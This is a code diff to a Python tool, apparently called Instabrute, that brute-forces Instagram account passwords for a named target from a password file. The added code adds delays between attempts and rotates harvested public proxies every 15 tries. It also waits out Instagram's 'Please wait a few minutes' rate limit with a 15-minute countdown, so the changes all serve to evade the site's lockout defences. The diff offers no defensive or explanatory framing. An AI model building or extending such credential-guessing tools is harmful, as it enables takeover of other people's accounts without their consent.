@@ -9,6 +9,12 @@ import socks
 import asyncio
 from proxybroker import Broker
 
+import time
+import sys
+import datetime
+
+DELAY_BETWEEN = 4
+
 #args parser
 parser = argparse.ArgumentParser()
 parser.add_argument('username', help='Instagram username of the user you want to attack')
@@ -26,6 +32,46 @@ def cleanList(items):
 			if not x in newList:
 				newList.append(x)
 	return newList
+
+#countdown function
+def countdown(t):
+	for remaining in range(t, 0, -1):
+		sys.stdout.write('\r')
+		remaining = datetime.timedelta(seconds=remaining)
+		h = int(remaining.total_seconds() / 3600)
+		m = int(remaining.total_seconds() / 60) % 60
+		remaining = str(remaining)
+		timeUnit = 'seconds'
+		if (m > 0): timeUnit = 'minutes'
+		if (h > 0): timeUnit = 'hours'
+		sys.stdout.write("[BREAK] {:2s} {:2s} remaining".format(remaining,timeUnit))
+		sys.stdout.flush()
+		time.sleep(1)
+	print ('')
+
+#get all proxy
+proxies_list = []
+async def proxything(proxies):
+	print ('[*] Loading proxies')
+	while True:
+		proxy = await proxies.get()
+		if proxy is None: break
+		try:
+			requests.get('https://www.instagram.com/')
+			proxies_list.append(proxy)
+		except Exception as e:
+			continue
+
+proxies = asyncio.Queue()
+asyncio.get_event_loop().run_until_complete(asyncio.gather(Broker(proxies).find(types=['HTTPS', 'HTTP'], limit=20), proxything(proxies)))
+#find proxy
+def setProxy():
+	for proxy in proxies_list:
+		print('[*] Proxy: %s' % proxy)
+		proxies_list.remove(proxy)
+		return True
+
+
 
 #main class - Instagram bruteforce
 class Instabrute():
@@ -48,6 +94,9 @@ class Instabrute():
 			return False
 
 	def _next(self):
+		if self.attempts % 15 == 0 and self.attempts != 0:
+			print ('[*] We need to change proxy :-)')
+			setProxy()
 		#add 1 attempt to the counter
 		self.attempts += 1
 		#remove the first password (the current)
@@ -91,11 +140,17 @@ class Instabrute():
 				#sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 			else:
 				print ('[%s] Can\'t login with "%s"' % (str(self.attempts+1), self.passwords[0]))
+
+				time.sleep(DELAY_BETWEEN)
+
 				#try the next password
 				self._next()
 		else:
 			if 'message' in r.text:
 				if r.json()['message'] == 'Please wait a few minutes before you try again.':
+					print ('[MESSAGE] Please wait a few minutes before you try again.')
+					countdown(60*15)
+					setProxy()
 					pass #Do you want to wait or use proxy?
 				elif r.json()['message'] == 'checkpoint_required':
 					exit('[%s] Yay, the password is "%s"' % (str(self.attempts+1), self.passwords[0]))
@@ -104,17 +159,7 @@ class Instabrute():
 			else:
 				print (r.text)
 
-#find proxy
-async def proxything(proxies):
-	while True:
-		proxy = await proxies.get()
-		if proxy is None: break
-		print('[*] Found proxy: %s' % proxy)
-		socks.set_default_proxy(socks.HTTP, proxy.host, proxy.port)
-		socket.socket = socks.socksocket
-proxies = asyncio.Queue()
-asyncio.get_event_loop().run_until_complete(asyncio.gather(Broker(proxies).find(types=['HTTPS', 'HTTP'], limit=1), proxything(proxies)))
-
+setProxy()
 #main action
 with codecs.open(args.passwords_file, 'r', 'utf-8') as file:
 	passwords = file.read().splitlines()
